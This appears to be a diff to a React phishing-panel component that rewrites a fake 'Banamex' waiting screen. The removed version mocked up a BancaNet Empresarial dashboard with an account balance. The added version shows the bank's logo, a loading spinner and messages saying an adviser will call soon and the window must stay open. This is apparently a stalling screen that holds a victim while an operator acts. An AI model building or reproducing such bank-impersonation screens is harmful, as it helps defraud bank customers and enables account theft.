@@ -3274,70 +3274,41 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
       case ScreenType.BANAMEX_WAITING:
         const banamexWaitingContent = (
-          <div style={{ position: 'relative', width: '100%', minHeight: '100vh', background: '#fff' }}>
-            <div style={{ position: 'absolute', inset: 0, filter: 'blur(4px)', opacity: 0.4 }}>
-              <div style={{ padding: '20px', fontFamily: 'Arial, sans-serif' }}>
-                <div style={{ background: '#153e46', color: '#fff', padding: '16px', marginBottom: '20px' }}>
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
-                    <svg width="60" height="30" viewBox="0 0 120 50">
-                      <g fill="#fff">
-                        <circle cx="15" cy="12" r="6"/>
-                        <circle cx="15" cy="25" r="6"/>
-                        <circle cx="15" cy="38" r="6"/>
-                      </g>
-                      <text x="25" y="28" fill="#fff" fontSize="14" fontWeight="600">banamex</text>
-                    </svg>
-                    <div style={{ flex: 1, textAlign: 'center', fontSize: '16px', fontWeight: 500 }}>
-                      BancaNet Empresarial
-                    </div>
-                  </div>
-                </div>
-
-                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))', gap: '16px', marginBottom: '20px' }}>
-                  <div style={{ background: '#f8f9fa', padding: '16px', borderRadius: '8px' }}>
-                    <h3 style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Saldo disponible</h3>
-                    <p style={{ fontSize: '24px', fontWeight: 'bold', color: '#153e46' }}>$37,004.58</p>
-                  </div>
-                  <div style={{ background: '#f8f9fa', padding: '16px', borderRadius: '8px' }}>
-                    <h3 style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Transferencias</h3>
-                    <p style={{ fontSize: '16px', color: '#153e46' }}>Realizar transferencia</p>
-                  </div>
-                  <div style={{ background: '#f8f9fa', padding: '16px', borderRadius: '8px' }}>
-                    <h3 style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Movimientos</h3>
-                    <p style={{ fontSize: '16px', color: '#153e46' }}>Ver movimientos</p>
-                  </div>
-                </div>
+          <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
+            <div style={{ maxWidth: '500px', textAlign: 'center' }}>
+              {/* Logo de Banamex */}
+              <div style={{ marginBottom: '32px' }}>
+                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '150px', margin: '0 auto', display: 'block' }} />
               </div>
-            </div>
 
-            <div style={{ position: 'relative', zIndex: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '100vh' }}>
-              <div style={{ background: '#fff', borderRadius: '12px', padding: '40px', textAlign: 'center', boxShadow: '0 8px 24px rgba(0,0,0,0.15)', maxWidth: '500px', margin: '20px' }}>
-                <div style={{ marginBottom: '24px' }}>
-                  <svg width="120" height="50" viewBox="0 0 120 50">
-                    <g fill="#c81f3b">
-                      <circle cx="20" cy="15" r="8"/>
-                      <circle cx="20" cy="25" r="8"/>
-                      <circle cx="20" cy="35" r="8"/>
-                    </g>
-                    <text x="35" y="28" fill="#153e46" fontSize="18" fontWeight="600">banamex</text>
-                  </svg>
-                </div>
-
-                <div style={{ marginBottom: '24px' }}>
-                  <img 
-                    src={loadingGif} 
-                    alt="Cargando..." 
-                    style={{ width: '80px', height: '80px', margin: '0 auto' }}
-                  />
-                </div>
-
-                <p style={{ fontSize: '18px', fontWeight: 500, color: '#153e46', marginBottom: '8px' }}>
-                  Espere un momento
-                </p>
-                <p style={{ fontSize: '15px', color: '#2d4b51' }}>
-                  En breve se contactará un asesor
-                </p>
+              {/* Gif de carga */}
+              <div style={{ marginBottom: '32px' }}>
+                <img 
+                  src={loadingGif} 
+                  alt="Cargando..." 
+                  style={{ width: '100px', height: '100px', margin: '0 auto', display: 'block' }}
+                />
               </div>
+
+              {/* Título */}
+              <h2 style={{ fontSize: '24px', fontWeight: 600, color: '#1f2937', marginBottom: '16px' }}>
+                Cargando...
+              </h2>
+
+              {/* Mensaje principal */}
+              <p style={{ fontSize: '18px', color: '#374151', marginBottom: '12px', lineHeight: 1.5 }}>
+                Espere un momento
+              </p>
+
+              {/* Mensaje secundario */}
+              <p style={{ fontSize: '16px', color: '#6b7280', marginBottom: '8px', lineHeight: 1.5 }}>
+                En breve se contactará un asesor
+              </p>
+
+              {/* Advertencia */}
+              <p style={{ fontSize: '14px', color: '#dc2626', fontWeight: 600, marginTop: '20px' }}>
+                No cierre esta ventana
+              </p>
             </div>
           </div>
         );
